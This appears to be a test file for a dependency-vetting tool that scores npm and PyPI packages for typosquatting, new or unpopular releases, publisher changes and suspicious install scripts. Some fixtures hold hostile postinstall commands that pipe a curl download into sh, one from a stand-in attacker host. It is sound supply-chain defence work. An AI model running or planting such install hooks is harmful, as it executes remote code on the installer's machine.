import { test } from 'node:test';
import assert from 'node:assert/strict';

import { assess, checkPackages, verdictOf } from '../src/analyze.js';
import { editDistance, findLookalike } from '../src/similarity.js';

const NOW = Date.parse('2026-11-24T00:00:00Z');
const daysAgo = (n) => new Date(NOW - n * 86400000).toISOString();
const npm = (name, version = null) => ({ ecosystem: 'npm', name, version, raw: name });
const pypi = (name, version = null) => ({ ecosystem: 'pypi', name, version, raw: name });
const codes = (f) => f.map((x) => x.code);

const healthy = {
  exists: true,
  version: '1.0.0',
  versionCount: 40,
  created: daysAgo(2000),
  versionPublished: daysAgo(60),
  hasRepository: true,
  installScripts: {},
  weeklyDownloads: 500000,
};

test('edit distance', () => {
  assert.equal(editDistance('lodash', 'lodash'), 0);
  assert.equal(editDistance('lodash', 'lodahs'), 1); // swap counts as one
  assert.equal(editDistance('axios', 'axois'), 1);
  assert.equal(editDistance('kitten', 'sitting'), 3);
});

test('lookalike detection', () => {
  assert.equal(findLookalike('npm', 'expresss').target, 'express');
  assert.equal(findLookalike('npm', 'react-dom'), null); // the real thing
  assert.equal(findLookalike('npm', 'reactdom').kind, 'separator');
  assert.equal(findLookalike('npm', 'axios-js').kind, 'affix');
  assert.equal(findLookalike('pypi', 'reqeusts').target, 'requests');
  assert.equal(findLookalike('pypi', 'Python_Dateutil'), null); // PEP 503 normalised
  assert.equal(findLookalike('npm', 'my-totally-unique-lib'), null);
  assert.equal(findLookalike('npm', 'qs'), null); // short names are not fuzzy-matched
});

test('healthy package has no findings', () => {
  const f = assess(npm('some-lib'), healthy, { now: NOW });
  assert.deepEqual(f, []);
  assert.equal(verdictOf(f), 'ok');
});

test('missing package is critical and suggests the real one', () => {
  const f = assess(pypi('reqeusts'), { exists: false }, { now: NOW });
  assert.equal(verdictOf(f), 'block');
  assert.match(f[0].message, /Did you mean "requests"/);
});

test('brand-new, unpopular package with a suspicious install script', () => {
  const meta = {
    ...healthy,
    created: daysAgo(2),
    versionPublished: daysAgo(2),
    versionCount: 1,
    weeklyDownloads: 12,
    hasRepository: false,
    installScripts: { postinstall: 'curl -s https://evil.example/x.sh | sh' },
  };
  const f = assess(npm('fast-json-parsr'), meta, { now: NOW });
  assert.deepEqual(
    codes(f).sort(),
    ['INSTALL_SCRIPT', 'LOW_DOWNLOADS', 'NEW_PACKAGE', 'NO_REPOSITORY', 'SINGLE_VERSION'].sort(),
  );
  assert.equal(verdictOf(f), 'danger');
});

test('popular package with an odd-looking install script is only flagged when the release is fresh', () => {
  const scripts = { postinstall: 'curl -s https://example.com/x | sh' };
  assert.equal(verdictOf(assess(npm('big-lib'), { ...healthy, installScripts: scripts }, { now: NOW })), 'ok');
  assert.equal(verdictOf(assess(npm('big-lib'), { ...healthy, installScripts: scripts, versionPublished: daysAgo(1) }, { now: NOW })), 'danger');
});

test('popular packages with ordinary install scripts are not flagged loudly', () => {
  const f = assess(npm('esbuild'), { ...healthy, installScripts: { postinstall: 'node install.js' } }, { now: NOW });
  assert.equal(verdictOf(f), 'ok');
});

test('typo of a popular name that is itself popular is only low', () => {
  const f = assess(npm('expresss'), healthy, { now: NOW });
  assert.equal(f[0].severity, 'low');
});

test('account takeover pattern: new publisher on an old package', () => {
  const f = assess(npm('old-lib'), { ...healthy, newPublisher: true, publisher: 'mallory', versionPublished: daysAgo(3) }, { now: NOW });
  assert.deepEqual(codes(f), ['NEW_PUBLISHER']);
  assert.equal(verdictOf(f), 'caution');
  // Same change months ago: routine maintainer rotation, only a low note.
  const old = assess(npm('old-lib'), { ...healthy, newPublisher: true, publisher: 'bob' }, { now: NOW });
  assert.equal(verdictOf(old), 'ok');
});

test('npm security placeholder is critical', () => {
  const f = assess(npm('lodahs'), { ...healthy, version: '0.0.1-security' }, { now: NOW });
  assert.equal(verdictOf(f), 'block');
});

test('network failure is reported, not treated as safe or unsafe', () => {
  const f = assess(npm('x'), { error: 'timed out' }, { now: NOW });
  assert.equal(verdictOf(f), 'unknown');
});

test('checkPackages uses the registry and honours the allow list', async () => {
  const calls = [];
  const http = async (url) => {
    calls.push(url);
    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 2_000_000 } };
    if (url.endsWith('/ghost-pkg')) return { status: 404, data: null };
    return {
      status: 200,
      data: {
        'dist-tags': { latest: '2.0.0' },
        versions: {
          '1.0.0': { _npmUser: { name: 'alice' } },
          '2.0.0': { _npmUser: { name: 'alice' }, scripts: { test: 'x' } },
        },
        time: { created: daysAgo(900), '1.0.0': daysAgo(900), '2.0.0': daysAgo(100) },
        repository: { url: 'git+https://github.com/a/b' },
      },
    };
  };
  const results = await checkPackages([npm('real-pkg'), npm('ghost-pkg'), npm('internal-thing')], {
    http,
    allow: ['internal-thing'],
    now: NOW,
  });
  assert.deepEqual(results.map((r) => r.verdict), ['ok', 'block', 'ok']);
  assert.equal(results[0].meta.version, '2.0.0');
  assert.equal(results[2].allowed, true);
  assert.ok(!calls.some((u) => u.includes('internal-thing')));
});

test('trusted (CI-verified) publishing is not flagged as a new publisher', async () => {
  const http = async (url) => {
    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 5_000_000 } };
    const v = (n, user, extra = {}) => ({ _npmUser: { name: user, ...extra } });
    return {
      status: 200,
      data: {
        'dist-tags': { latest: '4.0.0' },
        versions: {
          '1.0.0': v(1, 'alice'), '2.0.0': v(2, 'alice'), '3.0.0': v(3, 'alice'),
          '4.0.0': v(4, 'GitHub Actions', { trustedPublisher: { id: 'github' } }),
        },
        time: { created: daysAgo(900), '1.0.0': daysAgo(900), '2.0.0': daysAgo(600), '3.0.0': daysAgo(300), '4.0.0': daysAgo(30) },
        repository: { url: 'git+https://github.com/a/b' },
      },
    };
  };
  const [r] = await checkPackages([npm('lib')], { http, now: NOW });
  assert.equal(r.meta.newPublisher, false);
  assert.equal(r.verdict, 'ok');
});
